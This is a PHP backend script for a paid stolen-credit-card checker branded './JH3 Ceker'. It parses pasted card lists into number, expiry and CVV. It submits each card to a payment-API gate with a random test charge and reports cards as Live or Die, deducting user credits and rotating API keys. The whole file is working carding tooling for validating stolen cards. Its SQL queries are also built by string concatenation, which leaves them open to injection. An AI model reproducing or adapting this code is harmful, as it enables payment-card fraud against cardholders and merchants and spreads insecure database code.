<?php
session_start();
error_reporting(0); 
if (empty($_SESSION['email'])) {
echo '{"error":1,"msg":"Error! You Not Login!"}';
exit;
}

include'../config.php';
$email = $_SESSION['email'];
                    $query = "SELECT * FROM user WHERE email='$email'";
                    $exe = mysql_query($query);
                    $no = 1;
                    while($row = mysql_fetch_assoc($exe)){
                        $credit = $row['credits']; 
                        $admin = $row['admin']; 
                    }
if($admin==0){
echo '{"error":1,"msg":"You Not Paid User!"}';
break;
}
if ($credit < 5) {
echo '{"error":1,"msg":"Minimum Credits Is 5"}';
break;
}
$ccnum1 = $_POST['cclist'].'|';
$ccnum1 = str_replace("Live","",$ccnum1);
$ccnum1 = str_replace("LIVE","",$ccnum1);
if ($ccnum1 == 0) {
header('location: /');
break;
}
$ccnum1 = str_replace(" ","",$ccnum1);
$potong = str_replace("|","",$ccnum1);
$jumlah = strlen($potong);
$cc = substr($potong, 0, 1);
if ($cc == 4) {
if ($jumlah > 24) {
$num = substr($potong, 0, 16);
$expm = substr($potong, 16, 2);
$expy = substr($potong, 18, 4);
$cvv = substr($potong,22);
}
if ($jumlah < 24) {
$num = substr($potong, 0, 16);
$expm = substr($potong, 16, 2);
$expy = '20'.substr($potong, 18, 2);
$cvv = substr($potong,20);
}
}
if ($cc == 5) {
if ($jumlah > 24) {
$num = substr($potong, 0, 16);
$expm = substr($potong, 16, 2);
$expy = substr($potong, 18, 4);
$cvv = substr($potong,22);
}
if ($jumlah < 24) {
$num = substr($potong, 0, 16);
$expm = substr($potong, 16, 2);
$expy = '20'.substr($potong, 18, 2);
$cvv = substr($potong,20);
}
}
if ($cc == 3) {
if ($jumlah > 24) {
$num = substr($potong, 0, 15);
$expm = substr($potong, 15, 2);
$expy = substr($potong, 17, 4);
$cvv = substr($potong, 21);
}
if ($jumlah < 24) {
$num = substr($potong, 0, 15);
$expm = substr($potong, 15, 2);
$expy = '20'.substr($potong, 17, 2);
$cvv = substr($potong, 19);
}
}
if($cc == 6){
echo '{"error":-1,"msg":"<font color=purple><b>Unknown</b></font> | '.$ccnum1.' [CRE:'.$credit.'] ./JH3 Ceker"}';
break;
}
$charge=rand(50,200);
$cst = mysql_query("SELECT * FROM api WHERE status='1'");
while($cstapi = mysql_fetch_assoc($cst)){
$api = $cstapi['api'];
}

$format = $num.'|'.$expm.'|'.$expy.'|'.$cvv;
$hasil = file_get_contents('http://'.$_SERVER['HTTP_HOST'].'/cstapi/send-payments.php?ccn='.$num.'&ccm='.$expm.'&ccy='.$expy.'&cvv='.$cvv.'&charge='.$charge.'&api='.$api.'');
$a = json_decode($hasil, true);
$b = $a['status'];
$cre='[CRE:'.$credit.']';
$keredit=$credit-2;
if ($b == 1) {
mysql_query("UPDATE `user` SET `credits`=credits-2 WHERE email='$email'");
echo '{"error":0,"msg":"<font color=green><b>Live</b></font> | '.$ccnum1.' [CRE:'.$keredit.'] [GATE:01] ./JH3 Ceker"}';
break;
} if ($b == 2) {
echo '{"error":2,"msg":"<font color=red><b>Die</b></font> | '.$ccnum1.' '.$cre.' [GATE:01] ./JH3 Ceker"}';
break;
} if ($b == 3) {
echo '{"error":-1,"msg":"<font color=purple><b>Unknown</b></font> | '.$format.' | '.$cre.' [GATE:01] ./JH3 Ceker"}';
break;
}
if ($b == 4) {
mysql_query("UPDATE `api` SET `status`='3' WHERE api='$api'");
echo '{"error":-1,"msg":"<font color=blue><b>Api Key Expired</b></font> | '.$format.' | '.$cre.' [GATE:01] ./JH3 Ceker"}';
break;
}
if ($b == 5) {
echo '{"error":-1,"msg":"<font color=purple><b>Unknown</b></font> | '.$format.' | '.$cre.' [GATE:01] ./JH3 Ceker"}';
}
mysql_query("UPDATE `api` SET `status`='3' WHERE api='$api'");
echo '{"error":-1,"msg":"<font color=blue><b>Api Key Expired</b></font> | '.$format.' | '.$cre.' [GATE:01] ./JH3 Ceker"}';
break;
?>